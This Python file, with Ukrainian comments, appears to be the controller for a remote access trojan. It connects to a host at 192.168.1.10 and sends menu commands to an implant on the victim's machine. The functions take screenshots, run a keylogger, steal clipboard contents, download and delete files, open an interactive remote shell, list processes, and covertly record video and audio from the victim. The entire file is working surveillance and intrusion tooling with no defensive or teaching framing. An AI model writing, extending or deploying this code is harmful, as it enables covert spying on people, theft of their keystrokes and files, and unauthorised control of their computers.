import socket

def start_keylogger(client):
    print("Starting keylogger...")
    response = client.recv(1024).decode()
    print(response)

    input("Press Enter to stop the keylogger...")
    client.sendall(b"STOP_KEYLOGGER")

    log = client.recv(4096).decode()
    print("Keylogger data:\n" + log)

    # Збереження у файл
    with open("keylog.txt", "w") as f:
        f.write(log)
    print("Keylogger data saved to 'keylog.txt'")

def save_file(filename, client_socket):
    # Отримання розміру файлу
    file_size = int(client_socket.recv(1024).decode())
    client_socket.sendall(b"OK")
    # Отримання самого файлу
    data = b""
    while len(data) < file_size:
        chunk = client_socket.recv(1024)
        data += chunk
    with open(filename, "wb") as file:
        file.write(data)

def interactive_shell(client):
    print("Interactive shell mode. Type 'exit' to return to main menu.")
    while True:
        command = input("shell> ").strip()
        client.send(command.encode())
        if command.lower() == "exit":
            response = client.recv(1024).decode()
            print(response)
            break
        response = client.recv(4096).decode()
        print(response)

def list_dir(client):
    response = client.recv(4096).decode()
    print("Directory contents:\n" + response)

def open_dir(client):
    new_dir = input("Enter directory path: ").strip()
    client.send(new_dir.encode())
    response = client.recv(4096).decode()
    print(response)

def download_file(client):
    file_name = input("Enter file name to download: ").strip()
    client.send(file_name.encode())
    save_file(file_name, client)
    print(f"File '{file_name}' downloaded.")

def delete_file(client):
    file_name = input("Enter file name to delete: ").strip()
    client.send(file_name.encode())
    response = client.recv(1024).decode()
    print(response)

def search_file(client):
    file_name = input("Enter the file name to search: ").strip()
    client.send(file_name.encode())
    response = client.recv(4096).decode()
    print("Search results:\n" + response)

def get_processes(client):
    response = client.recv(4096).decode()  # Отримуємо список процесів
    print("Running Processes:\n" + response)

def main():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("192.168.1.10", 9999))

    while True:
        print("Commands:")
        print("1. screenshot")
        print("2. system_info")
        print("3. list_dir")
        print("4. open_dir")
        print("5. download")
        print("6. delete")
        print("7. cmd")
        print("8. search_file")
        print("9. running_processes")
        print("10. keylogger")
        print("11. exit")
        print("12. clipboard")
        print("13. video_record")
        print("14. audio_record")

        command = input("Enter command number: ").strip()
        client.send(command.encode())  # Надсилається лише цифра
        
        if command == "1":
            save_file("received_screenshot.png", client)
            print("Screenshot saved as 'received_screenshot.png'")
        elif command == "2":
            info = client.recv(1024).decode()
            print(f"System Info: {info}")
        elif command == "7":
            response = client.recv(1024).decode()
            print(response)
            interactive_shell(client)
        elif command == "11":
            print("Exiting...")
            break
        elif command == "3":
            list_dir(client)
        elif command == "4":
            open_dir(client)
        elif command == "5":
            download_file(client)
        elif command == "6":
            delete_file(client)
        elif command == "8":
            search_file(client)
        elif command == "9":
            get_processes(client)
        elif command == "10":
            start_keylogger(client)
        elif command == "12":
            response = client.recv(4096).decode()
            print(f"Clipboard content: {response}")
        elif command == "13":  # Запис відео
            duration = int(input("Enter video recording duration (in seconds): ").strip())
            client.send(str(duration).encode())
            save_file("received_video.avi", client)
            print("Video saved as 'received_video.avi'")
        elif command == "14":  # Запис аудіо
            duration = int(input("Enter audio recording duration (in seconds): ").strip())
            client.send(str(duration).encode())
            save_file("received_audio.wav", client)
            print("Audio saved as 'received_audio.wav'")
        else:
            print(client.recv(1024).decode())

    client.close()

if __name__ == "__main__":
    main()
